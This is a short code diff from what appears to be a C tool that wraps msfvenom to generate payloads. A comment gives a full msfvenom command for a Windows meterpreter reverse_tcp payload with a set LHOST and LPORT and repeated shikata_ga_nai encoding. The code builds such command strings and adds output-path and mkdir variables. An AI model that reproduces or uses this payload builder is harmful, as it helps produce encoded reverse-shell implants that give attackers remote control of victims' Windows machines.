@@ -1,7 +1,9 @@
 // payload string
 // msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.16 LPORT=55315 -a x86 --platform windows -e x86/shikata_ga_nai -i 4 -n 24 -K -f csharp -o /root/payload.cs
-char*  Choice;
-char*  platformSelected ;
+char	*Choice;
+char 	*platformSelected ;
+char	*pathoutput;  
+char	*mkdirB			="mkdir ";  
 char	*payloadBuild		="msfvenom -p ";
 char	*lhostBuild		=" LHOST=";
 char	lhost[25]		="192.168.0.1";
